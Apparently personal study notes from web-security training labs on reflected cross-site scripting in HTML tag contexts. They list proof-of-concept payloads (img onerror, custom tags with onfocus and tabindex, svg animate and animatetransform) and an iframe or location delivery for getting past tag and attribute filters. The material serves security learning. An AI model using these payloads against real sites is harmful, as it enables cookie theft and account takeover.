When the XSS context is text between HTML tags, you need to introduce some new HTML tags designed to trigger execution of JavaScript.
Some useful ways of executing JavaScript are:
`<script>alert(document.domain)</script>`
`<img src=1 onerror=alert(1)>`

---
## Exploits
1. `<img src=1 onerror=alert(1)>`
2. `<img src=1 onerror=alert(1)>`
3. `<body onresize=print(1)>`
  `<iframe src="https://academy.net/?search=%3Cbody+onresize%3D%22print%28%29%22%3E" onload=this.style.width='1200px'>`
4. `<superman onfocus='alert(1)' id='x' tabindex='1'>`, 
  `https://abc.com?search=%3Csuper-man+onfocus%3D%27alert%281%29%27+id%3D%27x%27+tabindex%3D1%3E#x`
5. `<svg><a><animate attributeName=href values=javascript:alert(1) /><text>Click me</text>`
6. `<svg><animatetransform onbegin=alert(1) attributeName=transform>`


```js
<h1> Your search result 'ControlledValue' </h1>
<p>ControlledValue</p>
<h1></h1>
<h1></h1>
<h1></h1>
<h1></h1>
```

## main ideas
- You don't need to escape `<h1>`, `<p>` tags.

---
## Labs
### lab1
inside `<h1>`
```js
<section class="blog-header">
	<h1> 
		0 search results for 'ControllerValue'
	</h1>
</section>

___Exploit___
<img src=1 onerror=alert()> or
</h1><img src=1 onerror=alert(1)> or
<script>alert(1)</script>
```

### lab2
inside `<p>`
```js
<section class="comment">
	<p>
		<img src="/resources/images/avatarDefault.svg" class="avatar">
		<a id="author" href="http://ControlledValue.com">ControlledValue</a> | 10 October 2025
    </p>
	<p>ControlledValue</p>       //body
    <p></p>
</section>

____Exploit_____
<img src=1 onerror=alert()>
```

### lab3
#### WAF bypass
Some tags and attribute are blocked, Use burp intruder to guess all possible tags and attributes. 
```js
<h1> 
		0 search results for 'ControllerValue'
</h1>

____Exploit___server__
<iframe src="https://0a7b0062046131b8804521f5003000e1.web-security-academy.net/?search=%3Cbody+onresize%3D%22print%28%29%22%3E" onload=this.style.width='1200px'>

```

### lab4
#### Custom tags
- We can create our own custom tags by using `-` in middle of the name like `<custom-tag >` , `<customer-tag >`, `<sonic-man >`. even if this is unknown for the browser, when we add event to those tags it will be executed. `<sonic-man onmouseover=alert(1)>`.
- we can use `onfocus` attribute and `id='x'` and `tabindex` combined with hash `#` while using the url. so when we reqeust the page `http://abc.com#x` we focus on the attr.
	- We use `id` to be referenced using `#`, but this doesn't give us focus event. 
	- We combine it with attribute `tabindex` to give us focus event when we refrence its `id` using `#`.
```js
<h1>
	'controllerValue'
</h1>

___Exploit__server__

<script>
location = 'https://0a4d003404a216dc8065b77000af005b.web-security-academy.net/?search=%3Csuper-man+onfocus%3D%27alert%28document.cookie%29%27+id%3D%27x%27+tabindex%3D1%3E#x';
</script>
```
WE DON'T NEED EXPLOIT SERVER FOR THIS EXPLOIT, we can deliver it to victem and it will be successful.

### lab5
only `svg`, `animate`, `a` are allowed.
- `svg` can have other tags inside of it like `a`.
- `animate`is a tag that only exists inside `svg`tag. and used to specify attributes inside `tags` within `svg` for animating `svg`.  Example
```js
  <svg>
	  <img src=1>
		  <animate attributeName=onerror values=alert(1)>
```
- if we want to declare text on `svg`, we need to put the text inside `<text>`. --> `<svg><a><text>hello</text></a>`
- The main idea is, if `href` is blocked we can use `svg` + `animate` as alternative for creating `href` attribute.
```js
<svg>
	<a>
		<animate attributeName=href values=javascript:alert(1) />
		<text>Click me</text>
```


### lab6
only `svg`, `animatetransform`are allowed. and `onbegin` is the only allowed event listner.
```js
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```